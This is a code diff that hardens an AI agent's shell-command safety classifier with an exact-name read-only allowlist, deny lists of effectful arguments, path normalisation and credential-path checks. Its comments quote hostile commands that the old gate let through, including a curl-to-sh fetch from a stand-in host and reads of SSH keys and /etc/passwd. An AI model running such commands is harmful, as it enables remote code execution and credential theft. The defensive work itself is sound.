@@ -1,0 +1,585 @@
+--- halbert_core/halbert_core/tools/safety.py	2026-09-06 22:58:33
++++ /private/tmp/claude-501/-Volumes-4TB-BAD-Halbert/1c4f8f70-ff55-451a-86d5-eab129e684c5/scratchpad/wt/halbert_core/halbert_core/tools/safety.py	2026-09-07 03:30:02
+@@ -11,13 +11,16 @@
+ from dataclasses import dataclass
+ from typing import Dict, List, Set, Pattern, Optional
+ import fnmatch
++import os
+ import re
+ import logging
+ from pathlib import Path
+ 
+ logger = logging.getLogger('halbert.tools.safety')
+ 
++_HOME = str(Path.home())
+ 
++
+ _RISK_ORDER = {
+     "safe": 0, "low": 1, "medium": 2, "high": 3, "critical": 4,
+ }
+@@ -84,8 +87,248 @@
+         tokens[0] = tokens[0].rsplit("/", 1)[-1]
+         segments.append(" ".join(tokens))
+     return segments
++
++
++#: Read-only invocations, keyed on the executable's basename. ``True`` means
++#: the whole binary only observes; a frozenset means only those first
++#: arguments do. This table is the gate: a command that is not in it does not
++#: run without the owner saying so.
++#:
++#: It replaces nine ``^(ls|dir|find|locate)\s*``-style regexes. Those matched
++#: a bare prefix, so `lsof`, `idle_hack`, `filebeat`, `statistics_upload` and
++#: `iptables -F` all classified SAFE on the strength of their first two
++#: letters. Exact-name lookup cannot do that.
++READ_ONLY_COMMANDS: Dict[str, object] = {
++    # coreutils and inspection
++    "ls": True, "dir": True, "vdir": True, "cat": True, "head": True,
++    "tail": True, "less": True, "more": True, "wc": True, "sort": True,
++    "uniq": True, "cut": True, "tr": True, "column": True, "nl": True,
++    "od": True, "xxd": True, "strings": True, "basename": True,
++    "dirname": True, "readlink": True, "realpath": True, "stat": True,
++    "file": True, "du": True, "df": True, "tree": True, "find": True,
++    "locate": True, "pwd": True, "whoami": True, "id": True, "groups": True,
++    "who": True, "w": True, "last": True, "hostname": True, "uname": True,
++    "date": True, "uptime": True, "echo": True, "printf": True,
++    "printenv": True, "which": True, "whereis": True, "type": True,
++    "man": True, "info": True, "apropos": True, "whatis": True,
++    "getent": True, "locale": True, "tty": True, "arch": True,
++    "grep": True, "egrep": True, "fgrep": True, "rg": True, "ag": True,
++    # processes and memory
++    "ps": True, "top": True, "htop": True, "btop": True, "free": True,
++    "vmstat": True, "iostat": True, "mpstat": True, "sar": True,
++    "pgrep": True, "pidof": True, "lsof": True, "vm_stat": True,
++    "pstree": True, "fuser": True,
++    # hardware and host facts
++    "lspci": True, "lsusb": True, "lscpu": True, "lsmod": True,
++    "lsblk": True, "findmnt": True, "blkid": True, "dmidecode": True,
++    "sensors": True, "nvidia-smi": True, "rocm-smi": True, "nvcc": True,
++    "mokutil": True, "sw_vers": True, "system_profiler": True,
++    "ioreg": True, "smartctl": True, "kextstat": True, "getenforce": True,
++    "systemd-detect-virt": True, "systemd-analyze": True,
++    "hostnamectl": True, "localectl": True, "timedatectl": True,
++    "loginctl": True, "tlp-stat": True, "lsattr": True, "getfacl": True,
++    # network, read-only
++    "ping": True, "ping6": True, "traceroute": True, "dig": True,
++    "host": True, "nslookup": True, "ss": True, "netstat": True,
++    "ifconfig": True, "iwconfig": True, "arp": True, "resolvectl": True,
++    "scutil": True,
++    "ip": frozenset({"addr", "a", "link", "l", "route", "r", "neigh", "n",
++                     "-j", "-json", "-d", "-br", "-s", "-4", "-6"}),
++    "iptables": frozenset({"-L", "-S", "--list", "--list-rules"}),
++    "nft": frozenset({"list"}),
++    "route": frozenset({"-n", "get"}),
++    "ethtool": frozenset(),
++    "iw": frozenset({"dev", "list", "phy", "reg"}),
++    "wg": frozenset({"show"}),
++    "tailscale": frozenset({"status", "ip", "netcheck", "version", "whois",
++                            "drive"}),
++    "nmcli": frozenset({"device", "connection", "general", "networking",
++                        "radio", "-t", "-f", "-g"}),
++    "firewall-cmd": frozenset({"--state", "--list-all", "--get-zones",
++                               "--get-active-zones", "--list-services"}),
++    "ufw": frozenset({"status"}),
++    "networksetup": frozenset({"-listallnetworkservices", "-getinfo",
++                               "-listallhardwareports", "-getdnsservers"}),
++    "socketfilterfw": frozenset({"--getglobalstate", "--getstealthmode",
++                                 "--listapps", "--getblockall"}),
++    "fail2ban-client": frozenset({"status", "get"}),
++    "aa-status": True,
++    # services and logs
++    "journalctl": True, "dmesg": True,
++    "systemctl": frozenset({"status", "show", "cat", "list-units",
++                            "list-timers", "list-sockets", "list-unit-files",
++                            "list-jobs", "list-dependencies", "is-active",
++                            "is-enabled", "is-failed", "is-system-running",
++                            "get-default", "show-environment", "--user",
++                            "--system", "--failed", "--version"}),
++    "launchctl": frozenset({"list", "print", "print-disabled", "dumpstate"}),
++    "service": frozenset({"--status-all"}),
++    "udevadm": frozenset({"info", "monitor"}),
++    # package managers, query verbs only
++    "apt": frozenset({"list", "show", "search", "policy", "depends",
++                      "rdepends"}),
++    "apt-cache": True,
++    "apt-mark": frozenset({"showhold", "showauto", "showmanual"}),
++    "dpkg": frozenset({"-l", "-L", "-s", "-S", "--list", "--status",
++                       "--search"}),
++    "dpkg-query": True,
++    "rpm": frozenset({"-q", "-qa", "-qi", "-ql", "-qf", "--query"}),
++    "dnf": frozenset({"list", "info", "search", "check-update", "repoquery",
++                      "history", "repolist"}),
++    "yum": frozenset({"list", "info", "search", "check-update", "repolist"}),
++    "pacman": frozenset({"-Q", "-Qi", "-Ql", "-Qs", "-Qe", "-Qdt", "-Qdtq",
++                         "-Si", "-Ss", "-F"}),
++    "checkupdates": True,
++    "brew": frozenset({"list", "ls", "info", "outdated", "config", "deps",
++                       "search", "home", "leaves", "uses", "desc", "doctor",
++                       "--version", "--prefix", "--cellar"}),
++    "port": frozenset({"installed", "list", "info", "outdated", "echo"}),
++    "mas": frozenset({"list", "outdated", "info", "account"}),
++    "snap": frozenset({"list", "info", "find", "changes", "connections",
++                       "services", "version"}),
++    "flatpak": frozenset({"list", "info", "search", "history", "remotes",
++                          "remote-ls"}),
++    "pip": frozenset({"list", "show", "freeze", "check", "--version"}),
++    "pip3": frozenset({"list", "show", "freeze", "check", "--version"}),
++    "npm": frozenset({"ls", "list", "view", "outdated", "config",
++                      "--version"}),
++    # containers and orchestration, read verbs
++    "docker": frozenset({"ps", "images", "info", "inspect", "logs",
++                         "version", "stats", "port", "top", "diff",
++                         "history", "events", "system", "--version"}),
++    "podman": frozenset({"ps", "images", "info", "inspect", "logs",
++                         "version", "stats", "port", "top", "diff",
++                         "history", "--version"}),
++    "kubectl": frozenset({"get", "describe", "logs", "top", "explain",
++                          "api-resources", "version", "cluster-info"}),
++    "helm": frozenset({"list", "ls", "status", "get", "history", "show",
++                       "search", "version"}),
++    "virsh": frozenset({"list", "dominfo", "domstate", "net-list",
++                        "pool-list"}),
++    "VBoxManage": frozenset({"list", "showvminfo"}),
++    "lxc": frozenset({"list", "info", "config"}),
++    # storage and backup, read verbs
++    "zfs": frozenset({"list", "get", "holds", "version"}),
++    "zpool": frozenset({"list", "status", "get", "history", "iostat",
++                        "version"}),
++    "btrfs": frozenset({"filesystem", "fi", "subvolume", "device", "qgroup"}),
++    "snapper": frozenset({"list", "list-configs", "get-config", "status",
++                          "-c"}),
++    "diskutil": frozenset({"list", "info", "apfs", "cs"}),
++    "tmutil": frozenset({"destinationinfo", "latestbackup", "listbackups",
++                         "listlocalsnapshots", "status", "machinedirectory"}),
++    "rclone": frozenset({"listremotes", "ls", "lsd", "lsjson", "about",
++                         "version"}),
++    "kopia": frozenset({"repository", "snapshot", "policy"}),
++    "mdadm": frozenset({"--detail", "--examine", "-D", "-E"}),
++    "swapon": frozenset({"--show", "-s"}),
++    "exportfs": frozenset({"-v", "-s"}),
++    "efibootmgr": frozenset({"-v", "--verbose"}),
++    "mount": frozenset({"-t"}),
++    "testparm": frozenset({"-s", "--suppress-prompt"}),
++    # source control
++    "git": frozenset({"status", "log", "diff", "show", "branch", "remote",
++                      "describe", "blame", "shortlog", "ls-files",
++                      "rev-parse", "tag", "reflog", "grep", "cat-file"}),
++    # desktop, audio, power, misc
++    "gsettings": frozenset({"get", "list-keys", "list-schemas",
++                            "list-recursively"}),
++    "defaults": frozenset({"read", "read-type", "domains"}),
++    "pactl": frozenset({"list", "info", "stat", "get-sink-volume",
++                        "get-default-sink", "get-default-source"}),
++    "pw-cli": frozenset({"info", "ls", "dump"}),
++    "pipewire": frozenset({"--version"}),
++    "xrandr": frozenset({"--query", "-q"}),
++    "prime-select": frozenset({"query"}),
++    "powerprofilesctl": frozenset({"get", "list"}),
++    "pmset": frozenset({"-g"}),
++    "nvram": frozenset({"-p", "-x"}),
++    "csrutil": frozenset({"status"}),
++    "spctl": frozenset({"--status", "--assess"}),
++    "fdesetup": frozenset({"status", "list", "isactive"}),
++    "codesign": frozenset({"-d", "-dv", "--display", "-v", "--verify"}),
++    "plutil": frozenset({"-p", "-lint"}),
++    "softwareupdate": frozenset({"-l", "--list"}),
++    "log": frozenset({"show", "stats"}),
++    "sysctl": frozenset({"-a", "-n", "-A", "-e"}),
++    "crontab": frozenset({"-l"}),
++    "ollama": frozenset({"list", "ps", "show", "--version"}),
++    "dscl": frozenset({"."}),
++    "fpcalc": True,
++}
+ 
++#: Arguments that revoke a read-only verdict for a binary that is otherwise
++#: in READ_ONLY_COMMANDS. ``find`` is the reason this table exists: it is far
++#: too useful to gate, and ``-exec`` turns it into a general-purpose
++#: execution engine -- ``find / -name '*.key' -exec sh -c '...' \;``
++#: classified SAFE, "Directory listing", and ran without a prompt.
++EFFECTFUL_ARGS: Dict[str, Set[str]] = {
++    "find": {"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fls",
++             "-fprint", "-fprint0", "-fprintf"},
++    "ip": {"set", "add", "del", "delete", "change", "replace", "flush",
++           "up", "down"},
++    "iptables": {"-A", "-I", "-D", "-R", "-N", "-X", "-F", "-Z", "-P"},
++    "nmcli": {"up", "down", "modify", "add", "delete", "edit", "reload"},
++    "nft": {"add", "delete", "flush", "insert", "replace"},
++    "ethtool": {"-s", "-K", "-G", "-C", "-A", "-p", "-r", "--change"},
++    "sysctl": {"-w", "-p", "--write", "--load"},
++    "btrfs": {"delete", "balance", "resize"},
++    "zfs": {"destroy", "rollback", "receive"},
++    "log": {"collect", "erase", "config"},
++    "plutil": {"-convert", "-replace", "-insert", "-remove"},
++    "git": {"--exec-path"},
++}
+ 
++
++def _normalise_path(token: str, cwd: Optional[str] = None) -> Optional[str]:
++    """One spelling for one file, or None when the token is not a path.
++
++    ``~/.ssh/authorized_keys`` and ``/Users/you/.ssh/authorized_keys`` and
++    ``.ssh/authorized_keys`` from $HOME are the same file; the old code
++    compared raw command text against home-expanded constants, so only the
++    third spelling was protected. Normalising first is the whole fix.
++    """
++    if not token or token.startswith("-"):
++        return None
++    if "=" in token and not token.startswith(("/", "~", ".", "$")):
++        token = token.split("=", 1)[1]
++        if not token:
++            return None
++    if not (token.startswith(("/", "~", "./", "../", "$HOME", "${HOME}"))
++            or "/" in token or cwd):
++        return None
++    expanded = token.replace("${HOME}", _HOME).replace("$HOME", _HOME)
++    expanded = os.path.expanduser(expanded)
++    if not expanded.startswith("/"):
++        if not cwd:
++            return None
++        expanded = os.path.join(cwd, expanded)
++    return os.path.normpath(expanded)
++
++
++def _paths_touched(command: str, cwd: Optional[str] = None) -> List[str]:
++    """Every filesystem path this line names, absolute and collapsed.
++
++    ``cwd`` is included and is used to resolve bare operands, because the
++    directory a command runs in is part of what it does: `rm grub.cfg` with
++    cwd=/boot is `rm /boot/grub.cfg`, and only the second was ever classified.
++    """
++    base = _normalise_path(cwd) if cwd else None
++    paths = [base] if base else []
++    for segment in _command_segments(command):
++        for token in segment.split()[1:]:
++            path = _normalise_path(token, base)
++            if path:
++                paths.append(path)
++    return paths
++
++
++def _under(path: str, root: str) -> bool:
++    """True when ``path`` is ``root`` or lies beneath it."""
++    root = root.rstrip("/")
++    return path == root or path.startswith(root + "/")
++
++
+ class ToolSafetyFramework:
+     """
+     Classifies tool operations by risk level.
+@@ -100,6 +343,9 @@
+         CRITICAL - Dangerous operations, block entirely
+     """
+     
++    READ_ONLY_COMMANDS = READ_ONLY_COMMANDS
++    EFFECTFUL_ARGS = EFFECTFUL_ARGS
++
+     # Commands that are ALWAYS blocked - no exceptions
+     # These are checked with word boundaries to avoid false positives
+     BLOCKED_COMMANDS: Set[str] = {
+@@ -256,52 +502,6 @@
+             "Link creation"
+         ),
+         
+-        # SAFE - Read-only operations
+-        SafetyRule(
+-            re.compile(r"^(cat|head|tail|less|more)\s+", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "File reading"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^(ls|dir|find|locate)\s*", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "Directory listing"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^(grep|egrep|fgrep|rg|ag)\s+", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "Text search"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^(wc|du|df|stat|file)\s*", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "File/disk info"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^(pwd|whoami|hostname|uname|date|uptime|id)", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "System info"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^systemctl\s+status", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "Service status"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^(ps|top|htop|free|vmstat|iostat)", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "Process/memory info"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^(ip|ifconfig|netstat|ss|ping|traceroute|dig|nslookup)", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "Network info"
+-        ),
+-        SafetyRule(
+-            re.compile(r"^echo\s+", re.IGNORECASE),
+-            RiskLevel.SAFE,
+-            "Echo command"
+-        ),
+     ]
+     
+     # Paths that elevate risk.
+@@ -330,6 +530,15 @@
+         str(Path.home() / ".gnupg") + "/",
+         str(Path.home() / ".config") + "/",
+     }
++
++    #: Paths where *reading* is already the harm. SENSITIVE_PATHS bumps a
++    #: verdict one notch, which leaves a read at LOW -- auto-execute. A
++    #: private key does not need a second notch to matter.
++    SECRET_PATHS: Set[str] = {
++        "/etc/shadow", "/etc/sudoers", "/etc/ssh",
++        _HOME + "/.ssh", _HOME + "/.gnupg", _HOME + "/.aws",
++        _HOME + "/.config/halbert/credentials",
++    }
+     
+     def __init__(self, user_overrides: Dict[str, RiskLevel] = None):
+         """
+@@ -439,7 +648,9 @@
+     def _classify_builtin(self, tool_name: str, args: Dict) -> SafetyCheckResult:
+         """The framework's own classification, before skill constraints."""
+         if tool_name == "run_command":
+-            return self._classify_command(args.get("command", ""))
++            return self._classify_command(
++                args.get("command", ""), args.get("cwd")
++            )
+         elif tool_name in ("write_file", "write_config"):
+             return self._classify_write(args.get("path", ""))
+         elif tool_name in ("read_file", "cat", "read_config"):
+@@ -574,32 +785,56 @@
+         segments.append("".join(current))
+         return [s.strip() for s in segments if s.strip()]
+ 
+-    def _every_segment_is_safe(self, command: str) -> bool:
+-        """True only when every command on the line matches a SAFE rule.
++    def _is_read_only(self, segment: str) -> bool:
++        """True when this one command only observes the host.
+ 
+-        The SAFE rules are anchored at the start of the string, so a line
+-        beginning with a benign command was classified on that command
+-        alone and everything after a chain operator went unexamined.
+-        ``ls && curl https://evil.sh | sh`` classified SAFE, "Directory
+-        listing", no confirmation -- the same shape as the `cwd` hole:
+-        text the gate never looked at reaching the shell with approval
+-        granted for something else.
++        Looked up by exact basename, never by prefix. Anything absent is not
++        called safe -- the classifier declines to vouch for it rather than
++        guessing from the first two letters.
+         """
++        tokens = segment.split()
++        if not tokens:
++            return False
++        head = tokens[0].rsplit("/", 1)[-1]
++        args = tokens[1:]
++        allowed = self.READ_ONLY_COMMANDS.get(head)
++        if allowed is None:
++            allowed = self.user_overrides.get(head)
++        if allowed is None:
++            return False
++        if any(a in self.EFFECTFUL_ARGS.get(head, ()) for a in args):
++            return False
++        if allowed is True:
++            return True
++        return True if not args else args[0] in allowed
++
++    def _every_segment_is_read_only(self, command: str) -> bool:
++        """True only when every command on the line is a read-only invocation.
++
++        A line beginning with a benign command used to be classified on that
++        command alone: ``ls && curl https://evil.sh | sh`` was SAFE,
++        "Directory listing", no confirmation. A redirection is disqualifying
++        outright -- ``ls > /etc/passwd`` reads as an ``ls``.
++        """
++        if ">" in command:
++            return False
+         segments = self._shell_segments(command)
+         if not segments:
+             return False
+-        safe_rules = [r for r in self.RULES if r.risk_level == RiskLevel.SAFE]
+-        return all(
+-            any(rule.pattern.search(seg) for rule in safe_rules)
+-            for seg in segments
+-        )
++        return all(self._is_read_only(s) for s in segments)
+ 
+-    def _classify_command(self, command: str) -> SafetyCheckResult:
+-        """Classify a shell command."""
++    def _classify_command(
++        self, command: str, cwd: Optional[str] = None
++    ) -> SafetyCheckResult:
++        """Classify a shell command.
++
++        Order is load-bearing. The dangerous rules run before the read-only
++        table so `sudo cat /etc/hosts` stays HIGH rather than being read as a
++        `cat`; the secret-path check runs before it so `cat ~/.ssh/id_ed25519`
++        is not a file read.
++        """
+         command = command.strip()
+-        command_lower = command.lower()
+-        
+-        # Check blocked commands first (exact matches)
++
+         for blocked in self.BLOCKED_COMMANDS:
+             if blocked in command:
+                 logger.warning(f"BLOCKED command: {command}")
+@@ -610,8 +845,7 @@
+                     reason=f"Blocked command pattern: {blocked}",
+                     matched_rule="BLOCKED_COMMANDS"
+                 )
+-        
+-        # Check blocked patterns (regex)
++
+         for pattern in self.BLOCKED_PATTERNS:
+             if pattern.search(command):
+                 logger.warning(f"BLOCKED command: {command}")
+@@ -619,66 +853,98 @@
+                     risk_level=RiskLevel.CRITICAL,
+                     allowed=False,
+                     requires_confirmation=False,
+-                    reason=f"Blocked command pattern",
++                    reason="Blocked command pattern",
+                     matched_rule=pattern.pattern
+                 )
+-        
+-        # A SAFE rule may only speak for a line it can see all of. The
+-        # dangerous rules below are searched against the whole string and so
+-        # already catch a chained `rm`; what they cannot catch is a chained
+-        # command nobody wrote a rule for.
+-        may_be_safe = self._every_segment_is_safe(command)
+ 
+-        # Check rules in order
++        paths = _paths_touched(command, cwd)
++
+         for rule in self.RULES:
+-            if rule.risk_level == RiskLevel.SAFE and not may_be_safe:
++            if rule.risk_level not in (RiskLevel.CRITICAL, RiskLevel.HIGH):
+                 continue
+             if rule.pattern.search(command):
+-                risk = rule.risk_level
+-                
+-                # Elevate risk if touching sensitive paths
+-                if risk in (RiskLevel.SAFE, RiskLevel.LOW, RiskLevel.MEDIUM):
+-                    for path in self.SENSITIVE_PATHS:
+-                        if path in command:
+-                            # Elevate by one level
+-                            if risk == RiskLevel.SAFE:
+-                                risk = RiskLevel.LOW
+-                            elif risk == RiskLevel.LOW:
+-                                risk = RiskLevel.MEDIUM
+-                            elif risk == RiskLevel.MEDIUM:
+-                                risk = RiskLevel.HIGH
+-                            break
+-                
+                 return SafetyCheckResult(
+-                    risk_level=risk,
+-                    allowed=risk != RiskLevel.CRITICAL,
+-                    requires_confirmation=risk == RiskLevel.HIGH,
++                    risk_level=rule.risk_level,
++                    allowed=rule.risk_level != RiskLevel.CRITICAL,
++                    requires_confirmation=rule.risk_level == RiskLevel.HIGH,
+                     reason=rule.reason,
+                     matched_rule=rule.pattern.pattern
+                 )
+-        
+-        # Check if command touches sensitive paths
+-        for path in self.SENSITIVE_PATHS:
+-            if path in command:
++
++        for secret in self.SECRET_PATHS:
++            if any(_under(p, secret) for p in paths):
+                 return SafetyCheckResult(
+-                    risk_level=RiskLevel.MEDIUM,
++                    risk_level=RiskLevel.HIGH,
+                     allowed=True,
+-                    requires_confirmation=False,
+-                    reason=f"Accesses sensitive path: {path}"
++                    requires_confirmation=True,
++                    reason=f"Touches a credential store: {secret}",
++                    matched_rule="SECRET_PATHS"
+                 )
+-        
+-        # Default for unrecognized commands
++
++        def elevate(risk: RiskLevel) -> RiskLevel:
++            """Bump one notch when the line names a path the owner cares about."""
++            for sensitive in self.SENSITIVE_PATHS:
++                if any(_under(p, sensitive) for p in paths):
++                    return {
++                        RiskLevel.SAFE: RiskLevel.LOW,
++                        RiskLevel.LOW: RiskLevel.MEDIUM,
++                        RiskLevel.MEDIUM: RiskLevel.HIGH,
++                    }.get(risk, risk)
++            return risk
++
++        if self._every_segment_is_read_only(command):
++            risk = elevate(RiskLevel.SAFE)
++            return SafetyCheckResult(
++                risk_level=risk,
++                allowed=True,
++                requires_confirmation=risk == RiskLevel.HIGH,
++                reason="Read-only invocation",
++                matched_rule="READ_ONLY_COMMANDS"
++            )
++
++        for rule in self.RULES:
++            if rule.risk_level in (RiskLevel.CRITICAL, RiskLevel.HIGH):
++                continue
++            if rule.pattern.search(command):
++                risk = elevate(rule.risk_level)
++                return SafetyCheckResult(
++                    risk_level=risk,
++                    allowed=True,
++                    requires_confirmation=risk == RiskLevel.HIGH,
++                    reason=rule.reason,
++                    matched_rule=rule.pattern.pattern
++                )
++
++        # Nothing recognised the line. That is not a severity claim -- it is
++        # the classifier declining to vouch, which is what confirmation is
++        # for. The old default ran it: a command no rule matched executed
++        # silently at MEDIUM, so every gap in the table was an open door.
+         return SafetyCheckResult(
+-            risk_level=RiskLevel.MEDIUM,
++            risk_level=RiskLevel.HIGH,
+             allowed=True,
+-            requires_confirmation=False,
+-            reason="Unrecognized command pattern"
++            requires_confirmation=True,
++            reason="Unrecognised command: not on the read-only list",
++            matched_rule="default"
+         )
+-    
++
+     def _classify_write(self, path: str) -> SafetyCheckResult:
+-        """Classify a file write operation."""
++        """Classify a file write operation.
++
++        The path is normalised first: the handler expands ``~`` before it
++        opens the file, so a gate that reads the raw argument is gating a
++        different string than the one that gets written.
++        """
++        resolved = _normalise_path(path) or path
++        for secret in self.SECRET_PATHS:
++            if _under(resolved, secret):
++                return SafetyCheckResult(
++                    risk_level=RiskLevel.HIGH,
++                    allowed=True,
++                    requires_confirmation=True,
++                    reason=f"Write to a credential store: {secret}"
++                )
+         for sensitive in self.SENSITIVE_PATHS:
+-            if path.startswith(sensitive) or sensitive in path:
++            if _under(resolved, sensitive):
+                 return SafetyCheckResult(
+                     risk_level=RiskLevel.HIGH,
+                     allowed=True,
